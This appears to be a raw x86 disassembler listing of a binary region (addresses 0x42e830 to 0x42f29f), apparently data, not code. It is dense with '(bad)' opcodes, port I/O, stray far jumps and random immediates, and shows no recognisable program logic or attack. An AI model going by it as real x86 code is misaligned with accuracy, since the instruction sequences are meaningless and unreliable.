  42e830:	sar    DWORD PTR [ecx-0x76],1
  42e833:	addr16 and al,0xee
  42e836:	rol    ecx,0x52
  42e839:	xor    DWORD PTR [edx],eax
  42e83b:	pop    esp
  42e83c:	enter  0x8a47,0xd7
  42e840:	and    eax,0x3c23ea6a
  42e845:	popf   
  42e846:	in     eax,dx
  42e847:	pop    ecx
  42e848:	out    0x1a,al
  42e84a:	and    eax,0x64389f3
  42e84f:	push   esp
  42e850:	add    BYTE PTR [edi],dl
  42e852:	(bad)  
  42e853:	mov    eax,ds:0x2f3dbdc5
  42e858:	push   ebp
  42e859:	ror    ebp,1
  42e85b:	into   
  42e85c:	rcr    BYTE PTR [edi+0x2c],0xe8
  42e860:	mov    dh,0x7c
  42e862:	inc    edi
  42e863:	jecxz  0x42e886
  42e865:	sbb    BYTE PTR [ebx+0xcf25c47],dl
  42e86b:	leave  
  42e86c:	pop    edi
  42e86d:	js     0x42e85f
  42e86f:	aas    
  42e870:	xchg   DWORD PTR [ebp-0x34895d45],esp
  42e876:	dec    ebx
  42e877:	in     al,dx
  42e878:	cs (bad) 
  42e87a:	sbb    eax,0x55537091
  42e87f:	clc    
  42e880:	sub    al,0x59
  42e882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e883:	or     DWORD PTR [edi-0x3995cbdc],ebp
  42e889:	stc    
  42e88a:	jbe    0x42e8a9
  42e88c:	sbb    BYTE PTR [edi],bh
  42e88e:	out    dx,eax
  42e88f:	out    0x9d,eax
  42e891:	cwde   
  42e892:	into   
  42e893:	fistp  DWORD PTR [edx-0x55ddb23]
  42e899:	daa    
  42e89a:	push   ss
  42e89b:	xor    ah,BYTE PTR [edx+0x46]
  42e89e:	cmp    bl,ah
  42e8a0:	dec    ecx
  42e8a1:	fs push edx
  42e8a3:	xchg   BYTE PTR [eax-0x6b5f572f],ch
  42e8a9:	dec    ebx
  42e8aa:	rcl    BYTE PTR [ebx-0xfc6281d],0x76
  42e8b1:	jecxz  0x42e84f
  42e8b3:	xor    bh,al
  42e8b5:	xlat   BYTE PTR ds:[ebx]
  42e8b6:	into   
  42e8b7:	sar    dh,1
  42e8b9:	jl     0x42e85c
  42e8bb:	int3   
  42e8bc:	xor    BYTE PTR ds:0xd042ae,bh
	...
  42e932:	add    BYTE PTR [eax],al
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xb9
  42e941:	inc    esp
  42e942:	gs mov ecx,0x1ebc6
  42e948:	cmc    
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    dh,dh
  42e94d:	cmp    al,0xe9
  42e94f:	enter  0xad87,0x38
  42e953:	test   dl,al
  42e955:	cmp    BYTE PTR [edx-0x1d],dh
  42e958:	into   
  42e959:	sub    ebp,DWORD PTR ds:0x4a7db218
  42e95f:	xlat   BYTE PTR ds:[ebx]
  42e960:	pop    eax
  42e961:	neg    DWORD PTR [ebp+0x59b96445]
  42e967:	pushf  
  42e968:	push   ds
  42e969:	jp     0x42e98c
  42e96b:	in     eax,0xe4
  42e96d:	fwait
  42e96e:	or     eax,0x8d98d17b
  42e973:	mov    bl,0x66
  42e975:	dec    ebp
  42e976:	pusha  
  42e977:	push   0x79
  42e979:	ds cmp eax,0x8c6b033c
  42e97f:	add    BYTE PTR [edx+0x6d05d6b6],cl
  42e985:	pop    edx
  42e986:	mov    esp,0x56b8234b
  42e98b:	aad    0x6d
  42e98d:	std    
  42e98e:	xchg   ecx,eax
  42e98f:	scas   al,BYTE PTR es:[edi]
  42e990:	rcr    BYTE PTR [ebp+0x63],0xd8
  42e994:	sub    eax,0x3b332977
  42e999:	cmp    al,0xf2
  42e99b:	sub    eax,0xf8fe8465
  42e9a0:	cmc    
  42e9a1:	or     BYTE PTR [eax],al
  42e9a3:	push   ss
  42e9a4:	dec    edi
  42e9a5:	std    
  42e9a6:	sub    eax,0x963cac08
  42e9ab:	sbb    edi,DWORD PTR ds:0x20bd144b
  42e9b1:	leave  
  42e9b2:	test   cl,cl
  42e9b4:	mov    edi,0x10f30f2e
  42e9b9:	inc    ebx
  42e9ba:	and    al,BYTE PTR [esi-0x35394c72]
  42e9c0:	push   0xb0bccee3
  42e9c5:	inc    ebx
  42e9c6:	pop    ecx
  42e9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9c8:	sbb    al,0xd2
  42e9ca:	jo     0x42ea01
  42e9cc:	in     al,0xc0
  42e9ce:	stos   DWORD PTR es:[edi],eax
  42e9cf:	leave  
  42e9d0:	loop   0x42e97e
  42e9d2:	movhps QWORD PTR [ebx+0x2b],xmm4
  42e9d6:	les    eax,FWORD PTR [ecx-0x76ecf667]
  42e9dc:	mov    edi,0xfa00e019
  42e9e1:	lods   eax,DWORD PTR ds:[esi]
  42e9e2:	xlat   BYTE PTR ds:[ebx]
  42e9e3:	call   ebx
  42e9e5:	outs   dx,DWORD PTR ds:[esi]
  42e9e6:	das    
  42e9e7:	inc    ebx
  42e9e8:	in     eax,0x48
  42e9ea:	cmp    eax,0x8edf20ba
  42e9ef:	jne    0x42ea3d
  42e9f1:	mov    eax,DWORD PTR [ecx-0x4f386055]
  42e9f7:	rol    DWORD PTR [ebx],cl
  42e9f9:	sbb    DWORD PTR [esi-0x77b1bc10],edx
  42e9ff:	jbe    0x42ea30
  42ea01:	cdq    
  42ea02:	cld    
  42ea03:	mov    dh,0xb5
  42ea05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea06:	enter  0xb01d,0x70
  42ea0a:	inc    esi
  42ea0b:	xchg   BYTE PTR [eax-0x2f403eff],cl
  42ea11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea12:	arpl   ax,bx
  42ea14:	mov    al,ds:0x68a77605
  42ea19:	mov    eax,ds:0xe175ac84
  42ea1e:	imul   ebx,esi,0xffffff80
  42ea21:	test   BYTE PTR [ecx],0xe3
  42ea24:	mov    ah,0x75
  42ea26:	dec    esi
  42ea27:	call   0xd410:0xd644c23f
  42ea2e:	js     0x42ea43
  42ea30:	lahf   
  42ea31:	leave  
  42ea32:	fcmovnu st,st(1)
  42ea34:	in     eax,0xd2
  42ea36:	es push edx
  42ea38:	fidiv  WORD PTR cs:[eax-0x5974551f]
  42ea3f:	push   es
  42ea40:	adc    BYTE PTR [eax],al
	...
  42eab2:	add    BYTE PTR [eax],al
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	and    eax,0xbb32e13e
  42eac5:	in     al,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	cmc    
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    BYTE PTR [ecx],ch
  42eacd:	adc    eax,0x96364748
  42ead2:	fcmovbe st,st(6)
  42ead4:	mov    esi,0x2e7f4549
  42ead9:	pop    edx
  42eada:	push   esp
  42eadb:	es int3 
  42eadd:	sub    ah,BYTE PTR [esp+eax*1+0x220c1143]
  42eae4:	push   esi
  42eae5:	pusha  
  42eae6:	in     al,0xa1
  42eae8:	lock mov edi,0xd3004ec3
  42eaee:	mov    al,0xc3
  42eaf0:	sti    
  42eaf1:	sbb    edi,DWORD PTR [eax-0x758928db]
  42eaf7:	js     0x42eaf5
  42eaf9:	jg     0x42eaca
  42eafb:	or     eax,0x437b18d5
  42eb00:	sbb    ch,BYTE PTR [ebp+0x74b68fb4]
  42eb06:	mov    eax,0x3f59e118
  42eb0b:	mov    gs,WORD PTR [eax+0x4a]
  42eb0e:	jl     0x42eaf0
  42eb10:	push   es
  42eb11:	xchg   edx,eax
  42eb12:	mov    bh,0xe7
  42eb14:	xchg   ecx,eax
  42eb15:	repz and DWORD PTR [edi],ebx
  42eb18:	cdq    
  42eb19:	xchg   esi,eax
  42eb1a:	ficom  WORD PTR [ebp-0x5dbd2da0]
  42eb20:	pop    ds
  42eb21:	jmp    0x9ea7:0xd89f9cd1
  42eb28:	dec    ebx
  42eb29:	xchg   edi,eax
  42eb2a:	push   ss
  42eb2b:	xchg   DWORD PTR [esi],eax
  42eb2d:	lahf   
  42eb2e:	nop
  42eb2f:	inc    esp
  42eb30:	inc    esp
  42eb31:	push   cs
  42eb32:	es cmp eax,0xef025fcc
  42eb38:	mov    dh,0x2d
  42eb3a:	or     cl,cl
  42eb3c:	xor    BYTE PTR [ecx+0x6d],ah
  42eb3f:	cmp    ah,ch
  42eb41:	push   cs
  42eb42:	sbb    ah,BYTE PTR [ecx-0x7d]
  42eb45:	xchg   edi,eax
  42eb46:	fstp   DWORD PTR [eax+0x1d17aeb7]
  42eb4c:	add    DWORD PTR [ecx-0x33],ebx
  42eb4f:	adc    esi,ecx
  42eb51:	mov    cl,BYTE PTR [ecx]
  42eb53:	icebp  
  42eb54:	rcl    BYTE PTR [ecx+0xffd4894],1
  42eb5a:	lods   eax,DWORD PTR ds:[esi]
  42eb5b:	pop    ss
  42eb5c:	and    BYTE PTR [ebx-0x43],ch
  42eb5f:	push   ss
  42eb60:	mov    ds:0x6aee68d,eax
  42eb65:	stc    
  42eb66:	les    esp,FWORD PTR [ebx]
  42eb68:	mov    al,ds:0x8d7da50c
  42eb6d:	mov    ecx,ecx
  42eb6f:	imul   edi
  42eb71:	popf   
  42eb72:	mov    cl,0x6b
  42eb74:	jne    0x42eba0
  42eb76:	jo     0x42eb40
  42eb78:	leave  
  42eb79:	int    0xc8
  42eb7b:	in     eax,0xaa
  42eb7d:	test   al,dl
  42eb7f:	inc    ecx
  42eb80:	das    
  42eb81:	cmp    al,0xef
  42eb83:	add    DWORD PTR [edx+ecx*4+0x63b9be81],edx
  42eb8a:	rcl    BYTE PTR [ecx+0x4b],0xd7
  42eb8e:	retf   0x4aa2
  42eb91:	test   BYTE PTR [esi-0x6b],bl
  42eb94:	jno    0x42ebf0
  42eb96:	push   edi
  42eb97:	and    al,0xa9
  42eb99:	(bad)  
  42eb9a:	adc    al,0x7f
  42eb9c:	xor    DWORD PTR [ebx+0x54587ed2],ebx
  42eba2:	pop    ebp
  42eba3:	sbb    DWORD PTR [ebp-0x6b],ebx
  42eba6:	lods   eax,DWORD PTR ds:[esi]
  42eba7:	(bad)  
  42eba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eba9:	mov    ebx,0x668b1111
  42ebae:	jb     0x42eb37
  42ebb0:	loopne 0x42ebde
  42ebb2:	in     eax,0x14
  42ebb4:	into   
  42ebb5:	mov    eax,ds:0x3d7272f8
  42ebba:	mov    ah,BYTE PTR [esi-0x56]
  42ebbd:	or     BYTE PTR [edi+0xed1],ah
	...
  42ec33:	add    BYTE PTR [ecx],bh
  42ec35:	mov    bh,0x6d
  42ec37:	pxor   mm3,mm7
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4-0x1d74897]
  42ec43:	or     DWORD PTR [eax-0xafffe13],esi
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [ebp+0x140bd3c0],ch
  42ec51:	mov    ebp,0x1d9e7bb6
  42ec56:	and    cl,BYTE PTR [ebp+ebx*4-0xc]
  42ec5a:	push   eax
  42ec5b:	mov    eax,0x5020969d
  42ec60:	push   ds
  42ec61:	jns    0x42ec8a
  42ec63:	outs   dx,DWORD PTR ds:[esi]
  42ec64:	call   0x83cf:0x29b851d5
  42ec6b:	shl    bh,cl
  42ec6d:	dec    eax
  42ec6e:	clc    
  42ec6f:	mov    esp,0x57d12a39
  42ec74:	sbb    esp,DWORD PTR [bp+0x49]
  42ec78:	rol    DWORD PTR [ecx],cl
  42ec7a:	mov    bl,0xea
  42ec7c:	xchg   esp,eax
  42ec7d:	call   0x600a:0xdb0b3a83
  42ec84:	mov    bh,0x3b
  42ec86:	loope  0x42ecc5
  42ec88:	test   al,0x18
  42ec8a:	inc    eax
  42ec8b:	push   eax
  42ec8c:	sub    ch,BYTE PTR [edi-0x7752a2a2]
  42ec92:	jne    0x42ec38
  42ec94:	jmp    0x42ec1b
  42ec96:	mov    bh,0x37
  42ec98:	stos   DWORD PTR es:[edi],eax
  42ec99:	sbb    esp,ebp
  42ec9b:	and    BYTE PTR [ecx],ah
  42ec9d:	mov    dh,0x70
  42ec9f:	push   ecx
  42eca0:	pushf  
  42eca1:	dec    edi
  42eca2:	ss adc al,0xc6
  42eca5:	and    BYTE PTR [ecx-0x716b3300],dl
  42ecab:	stc    
  42ecac:	and    BYTE PTR [ecx],ah
  42ecae:	and    edi,ecx
  42ecb0:	pop    edx
  42ecb1:	push   edx
  42ecb2:	in     al,dx
  42ecb3:	mov    eax,ds:0x46e2212
  42ecb8:	push   ss
  42ecb9:	repnz push ebx
  42ecbb:	sub    DWORD PTR [esi-0x621c38fd],edx
  42ecc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecc2:	(bad)
  42ecc5:	int    0x3b
  42ecc7:	imul   ecx,DWORD PTR [ebx],0x49
  42ecca:	out    0xad,al
  42eccc:	mov    al,0xc6
  42ecce:	cli    
  42eccf:	jge    0x42ed06
  42ecd1:	inc    eax
  42ecd2:	outs   dx,BYTE PTR ds:[esi]
  42ecd3:	adc    edx,ebx
  42ecd5:	mov    al,0xd4
  42ecd7:	and    al,0x48
  42ecd9:	int3   
  42ecda:	lds    eax,FWORD PTR [eax-0x41]
  42ecdd:	cli    
  42ecde:	test   eax,0x5fe39710
  42ece3:	lahf   
  42ece4:	setle  BYTE PTR [eax]
  42ece7:	arpl   WORD PTR [edx+0x45988e7f],si
  42eced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecee:	inc    ecx
  42ecef:	lea    esi,[ebp+0xd]
  42ecf2:	pop    esp
  42ecf3:	nop
  42ecf4:	out    0x63,eax
  42ecf6:	mov    cl,0x64
  42ecf8:	push   es
  42ecf9:	in     al,dx
  42ecfa:	push   ds
  42ecfb:	inc    ebx
  42ecfc:	sbb    dl,BYTE PTR [eax]
  42ecfe:	jne    0x42ec80
  42ed00:	neg    bh
  42ed02:	mov    BYTE PTR [ecx-0x53c6805e],dh
  42ed08:	xlat   BYTE PTR ds:[ebx]
  42ed09:	fisttp DWORD PTR [edi-0x1327b9d6]
  42ed0f:	push   cs
  42ed10:	pop    ebx
  42ed11:	sahf   
  42ed12:	jne    0x42ed48
  42ed14:	or     BYTE PTR [ecx],dh
  42ed16:	jmp    0x42ed80
  42ed18:	add    DWORD PTR [esi+ebp*1-0x518d86ac],edx
  42ed1f:	fcmove st,st(6)
  42ed21:	inc    esi
  42ed22:	jmp    0xdec5c09
  42ed27:	pop    ds
  42ed28:	in     al,dx
  42ed29:	call   DWORD PTR [edi]
  42ed2b:	mov    cl,0x99
  42ed2d:	inc    eax
  42ed2e:	pop    esi
  42ed2f:	fidiv  WORD PTR [edi+0x4f]
  42ed32:	jae    0x42ed12
  42ed34:	push   ebp
  42ed35:	push   es
  42ed36:	lods   eax,DWORD PTR ds:[esi]
  42ed37:	icebp  
  42ed38:	xchg   DWORD PTR [esi-0x319df0db],esp
  42ed3e:	cmp    DWORD PTR ds:0xa7,0x0
	...
  42edb1:	add    BYTE PTR [eax],al
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0xe8ebb3af
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [esi+0x5c],bl
  42edce:	sbb    eax,0x99e7b0cc
  42edd3:	iret   
  42edd4:	pop    edi
  42edd5:	test   DWORD PTR [ecx],0xb83ac4ac
  42eddb:	test   DWORD PTR [esi],esp
  42eddd:	shl    al,cl
  42eddf:	lods   eax,DWORD PTR ds:[esi]
  42ede0:	cld    
  42ede1:	inc    ebx
  42ede2:	lods   al,BYTE PTR ds:[esi]
  42ede3:	stos   BYTE PTR es:[edi],al
  42ede4:	and    dl,BYTE PTR ds:0x6e531d94
  42edea:	inc    ecx
  42edeb:	pop    ss
  42edec:	sub    eax,eax
  42edee:	cmp    DWORD PTR [ebx-0x6e],edi
  42edf1:	retf   
  42edf2:	icebp  
  42edf3:	push   eax
  42edf4:	xor    al,0xe1
  42edf6:	out    0x45,eax
  42edf8:	jecxz  0x42edc1
  42edfa:	or     ecx,eax
  42edfc:	nop
  42edfd:	push   esi
  42edfe:	leave  
  42edff:	mov    DWORD PTR [ebp-0x6ecfe922],ecx
  42ee05:	and    ah,ah
  42ee07:	ja     0x42edec
  42ee09:	inc    ebx
  42ee0a:	fcmovne st,st(5)
  42ee0c:	pop    eax
  42ee0d:	cwde   
  42ee0e:	mov    DWORD PTR [edi+0x5b],ebx
  42ee11:	dec    eax
  42ee12:	sar    BYTE PTR [ebx-0x68],1
  42ee15:	std    
  42ee16:	mov    WORD PTR [esi-0x71437b2],es
  42ee1c:	repz cmp DWORD PTR [ecx-0x47e67f1f],esp
  42ee23:	fwait
  42ee24:	and    DWORD PTR [edx],esp
  42ee26:	ror    BYTE PTR [edx+0x21],0x81
  42ee2a:	je     0x42ee52
  42ee2c:	inc    edi
  42ee2d:	stos   BYTE PTR es:[edi],al
  42ee2e:	xor    cl,BYTE PTR [ebx+0x15]
  42ee31:	imul   edx,DWORD PTR [edx],0x72cd5afe
  42ee37:	mov    eax,0x57f6b416
  42ee3c:	in     eax,dx
  42ee3d:	pop    esi
  42ee3e:	in     eax,0x2a
  42ee40:	jecxz  0x42ee21
  42ee42:	dec    ecx
  42ee43:	push   ebx
  42ee44:	push   ebx
  42ee45:	test   al,0xf9
  42ee47:	outs   dx,BYTE PTR ds:[esi]
  42ee48:	imul   DWORD PTR [eax+0x39d3ebf5]
  42ee4e:	aad    0x3c
  42ee50:	js     0x42eed1
  42ee52:	loopne 0x42ee59
  42ee54:	dec    eax
  42ee55:	and    edi,esi
  42ee57:	cdq    
  42ee58:	mov    ds:0x905363fb,al
  42ee5d:	mov    esi,0x359c031e
  42ee62:	sub    al,dh
  42ee64:	stc    
  42ee65:	push   ebp
  42ee66:	jecxz  0x42eeaf
  42ee68:	out    0xe7,al
  42ee6a:	mov    ds:0x4c8eac79,al
  42ee6f:	mov    edi,0x2e666217
  42ee74:	push   ss
  42ee75:	enter  0x5994,0xa
  42ee79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee7a:	jae    0x42ee0c
  42ee7c:	fs call 0x575c:0xe562d79e
  42ee84:	mov    BYTE PTR [eax+ebp*2-0x394f66d8],al
  42ee8b:	push   ebx
  42ee8c:	and    esi,DWORD PTR [eax+edx*4]
  42ee8f:	gs mov ecx,0x9f3bc3a6
  42ee95:	or     eax,0x68eec9fe
  42ee9a:	stc    
  42ee9b:	ret    0x3714
  42ee9e:	mov    fs,WORD PTR [edx-0x55b497e2]
  42eea4:	xor    edx,DWORD PTR [esi-0x1a63ff6b]
  42eeaa:	test   DWORD PTR [edi-0x4cc2635b],ecx
  42eeb0:	mul    ecx
  42eeb2:	imul   esi,DWORD PTR [ecx+0x6821a957],0xd5116064
  42eebc:	or     al,0xbf
  42eebe:	sub    ch,BYTE PTR [ebx+0x24]
	...
  42ef31:	add    BYTE PTR [eax],al
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz mov ebp,0x9ab4b035
  42ef45:	out    dx,eax
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	cmc    
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    ah,cl
  42ef4d:	inc    edi
  42ef4e:	(bad)  
  42ef4f:	retf   0x8590
  42ef52:	jg     0x42ef29
  42ef54:	je     0x42ef0e
  42ef56:	jae    0x42ef57
  42ef58:	mov    al,ds:0xfad8e60e
  42ef5d:	ret    
  42ef5e:	add    bh,BYTE PTR ds:0x26802ce8
  42ef64:	sti    
  42ef65:	pop    eax
  42ef66:	push   ebp
  42ef67:	retf   
  42ef68:	or     ebp,0xffffffd5
  42ef6b:	retf   
  42ef6c:	dec    ecx
  42ef6d:	in     eax,0xdb
  42ef6f:	mov    ah,0x7c
  42ef71:	mov    ecx,edx
  42ef73:	ror    DWORD PTR [edx+0x4e],cl
  42ef76:	(bad)  
  42ef77:	out    dx,eax
  42ef78:	in     eax,dx
  42ef79:	cwde   
  42ef7a:	(bad)  
  42ef7b:	loope  0x42ef8b
  42ef7d:	jbe    0x42effd
  42ef7f:	push   ecx
  42ef80:	into   
  42ef81:	dec    edi
  42ef82:	sbb    BYTE PTR [edi+0x126b4d28],al
  42ef88:	nop
  42ef89:	sbb    DWORD PTR [edi-0x10],esi
  42ef8c:	cmc    
  42ef8d:	sbb    BYTE PTR [ebx],bh
  42ef8f:	xlat   BYTE PTR ds:[ebx]
  42ef90:	pop    eax
  42ef91:	mov    bh,0x81
  42ef93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef94:	mov    ecx,0x215fba85
  42ef99:	push   0x2332a0d5
  42ef9e:	xor    eax,0x4fe1b49f
  42efa3:	add    ah,BYTE PTR [esi-0x56]
  42efa6:	cwde   
  42efa7:	add    DWORD PTR [eax],ebp
  42efa9:	or     eax,0x6fd4c5fd
  42efae:	sub    esp,ecx
  42efb0:	adc    al,BYTE PTR [eax]
  42efb2:	mov    eax,ds:0xc4830409
  42efb7:	std    
  42efb8:	mov    al,ds:0xac1391f6
  42efbd:	push   ebx
  42efbe:	cs mov ebx,0x7fe19caa
  42efc4:	or     DWORD PTR [ebx-0x2897d50f],0xffffff83
  42efcb:	dec    edx
  42efcc:	rcr    edx,cl
  42efce:	fsubrp st(0),st
  42efd0:	and    DWORD PTR [edi],edi
  42efd2:	adc    eax,0x486f8971
  42efd7:	ins    DWORD PTR es:[edi],dx
  42efd8:	mov    DWORD PTR [esi-0x37],ecx
  42efdb:	inc    eax
  42efdc:	add    BYTE PTR [esi+0x24],0xb9
  42efe0:	pop    ebp
  42efe1:	mov    bl,0x9b
  42efe3:	inc    ebp
  42efe4:	shl    BYTE PTR [esi],cl
  42efe6:	adc    ch,BYTE PTR ds:0x733f43c9
  42efec:	xchg   edi,eax
  42efed:	mov    eax,0x6400d64b
  42eff2:	sar    DWORD PTR [ecx-0x80],cl
  42eff5:	in     al,dx
  42eff6:	adc    al,0x72
  42eff8:	mov    eax,edx
  42effa:	(bad)  
  42effb:	jmp    0x3bac:0x22b3e002
  42f002:	add    DWORD PTR [esi-0x6b58fd52],ecx
  42f008:	(bad)  
  42f00a:	les    edi,FWORD PTR [edi-0x705b0201]
  42f010:	jle    0x42f011
  42f012:	lea    ecx,[ecx+ebp*2-0x26a986ff]
  42f019:	inc    DWORD PTR [edi+0x4a7baa7d]
  42f01f:	jecxz  0x42f02e
  42f021:	or     al,0x92
  42f023:	jns    0x42efb5
  42f025:	out    dx,eax
  42f026:	stos   DWORD PTR es:[edi],eax
  42f027:	mov    edi,0x351e748
  42f02c:	fs call 0x1941c2a
  42f032:	out    0x38,eax
  42f034:	sbb    BYTE PTR [esi+0x4a],ch
  42f037:	popf   
  42f038:	sub    al,0x0
  42f03a:	dec    eax
  42f03b:	dec    ecx
  42f03c:	addr16 ja 0x42f05d
  42f03f:	add    ecx,esp
	...
  42f0b1:	add    BYTE PTR [eax],al
  42f0b3:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c0:	int3   
  42f0c1:	cmp    dl,BYTE PTR [eax]
  42f0c3:	repnz (bad) 
  42f0c5:	lock add DWORD PTR [eax],eax
  42f0c8:	cmc    
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR [ecx],bh
  42f0cd:	mov    esi,0xe9ef4a97
  42f0d2:	or     DWORD PTR [esp+edi*1-0x58838fae],esi
  42f0d9:	inc    eax
  42f0da:	mov    cl,0x83
  42f0dc:	xchg   ecx,eax
  42f0dd:	inc    ebx
  42f0de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0df:	ret    0xfddb
  42f0e2:	mov    ch,BYTE PTR [edi]
  42f0e4:	jb     0x42f0a5
  42f0e6:	push   edi
  42f0e7:	push   eax
  42f0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0e9:	call   FWORD PTR [eax+0x34d7f5a]
  42f0ef:	(bad)  
  42f0f0:	ds mov ah,0xe9
  42f0f3:	fld    DWORD PTR [ebx+edx*1-0x387efaa]
  42f0fa:	and    BYTE PTR [esi-0x78702b66],ah
  42f100:	dec    ecx
  42f101:	sub    bh,BYTE PTR [edi]
  42f103:	imul   edx,edi,0x53420def
  42f109:	in     eax,dx
  42f10a:	pop    es
  42f10b:	outs   dx,DWORD PTR ds:[esi]
  42f10c:	es cli 
  42f10e:	adc    al,0x7c
  42f110:	inc    ecx
  42f111:	dec    BYTE PTR ds:0x93775944
  42f117:	and    dl,BYTE PTR [esi]
  42f119:	push   es
  42f11a:	(bad)  
  42f11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f11c:	test   eax,0x58582627
  42f121:	or     BYTE PTR ds:[edx-0x1197e22c],0xe
  42f129:	jmp    0xcbad:0xe48984c6
  42f130:	and    DWORD PTR ds:0x77f48062,ecx
  42f136:	and    eax,0xac8bb10a
  42f13b:	cmp    bl,dh
  42f13d:	dec    ebp
  42f13e:	scas   al,BYTE PTR es:[edi]
  42f13f:	lods   al,BYTE PTR ds:[esi]
  42f140:	popf   
  42f141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f142:	imul   edi,DWORD PTR [esi],0xe4bbe03b
  42f148:	pop    ebp
  42f149:	adc    eax,0x690242ab
  42f14e:	ja     0x42f1a5
  42f150:	shl    ch,1
  42f152:	idiv   BYTE PTR [edi]
  42f154:	mov    ecx,0x3d70a007
  42f159:	mov    ebx,es
  42f15b:	add    al,0xdc
  42f15d:	data16 jnp 0x42f1a8
  42f160:	sub    BYTE PTR [edi+eiz*8],al
  42f163:	mov    DWORD PTR [ebx-0x3c],ecx
  42f166:	mov    cl,0xdc
  42f168:	xchg   BYTE PTR [edx+0x6f],dl
  42f16b:	push   ecx
  42f16c:	aam    0x46
  42f16e:	fidivr WORD PTR [esi+0x61b4da41]
  42f174:	mov    ebp,0x706b99da
  42f179:	jnp    0x42f127
  42f17b:	push   es
  42f17c:	sub    DWORD PTR [edi],ecx
  42f17e:	jno    0x42f112
  42f180:	mov    WORD PTR [ebp-0x2aa3cc53],fs
  42f186:	loopne 0x42f1b2
  42f188:	aas    
  42f189:	mov    al,ds:0x1a49e129
  42f18e:	xor    esi,DWORD PTR [ebx+0x239d13ba]
  42f194:	mov    BYTE PTR [eax+0x6c],0xf9
  42f198:	push   eax
  42f199:	test   al,0x39
  42f19b:	cmp    cl,BYTE PTR [edi+0x1f]
  42f19e:	into   
  42f19f:	(bad)  
  42f1a0:	dec    ebx
  42f1a1:	sar    DWORD PTR [eax],1
  42f1a3:	cmp    eax,0xfb9060cb
  42f1a8:	mov    dl,0x94
  42f1aa:	not    BYTE PTR [ecx+0x2211ce39]
  42f1b0:	pop    eax
  42f1b1:	cmp    al,dl
  42f1b3:	fisub  WORD PTR [eax]
  42f1b5:	xchg   DWORD PTR [ebx-0x786f45f8],esp
  42f1bb:	dec    edx
  42f1bc:	repz inc ebx
  42f1be:	jnp    0x42f1a7
  42f1c0:	pop    edx
	...
  42f231:	add    BYTE PTR [eax],al
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	(bad)  
  42f241:	cmp    ah,BYTE PTR [edx]
  42f243:	test   BYTE PTR [ecx+esi*8+0xf50001],al
  42f24a:	add    BYTE PTR [eax],al
  42f24c:	mov    bl,0x69
  42f24e:	sub    DWORD PTR [ecx-0x59801c74],0xe3c7a6f9
  42f258:	mov    ah,BYTE PTR [ebx-0x35516f49]
  42f25e:	pop    ds
  42f25f:	push   ds
  42f260:	scas   eax,DWORD PTR es:[edi]
  42f261:	cmp    eax,0x30941495
  42f266:	or     BYTE PTR [edi-0x18dd92fc],ah
  42f26c:	loopne 0x42f29e
  42f26e:	cmp    eax,0xe4e85600
  42f273:	adc    DWORD PTR [edx-0x4fab06fb],esp
  42f279:	jmp    0x42f238
  42f27b:	(bad)  
  42f27c:	push   ss
  42f27d:	icebp  
  42f27e:	leave  
  42f27f:	loop   0x42f272
  42f281:	(bad)  
  42f282:	xlat   BYTE PTR ds:[ebx]
  42f283:	mov    ah,0xec
  42f285:	mov    bl,0xe9
  42f287:	test   al,0xd4
  42f289:	inc    ebx
  42f28a:	es push ss
  42f28c:	xchg   BYTE PTR [edx+0x4d],ah
  42f28f:	mov    esp,0x8d21719a
  42f294:	sbb    al,0xcc
  42f296:	ins    BYTE PTR es:[edi],dx
  42f297:	in     al,dx
  42f298:	vpshld xmm13,xmm7,xmm0
  42f29d:	dec    esi
  42f29e:	inc    edi
  42f29f:	into   
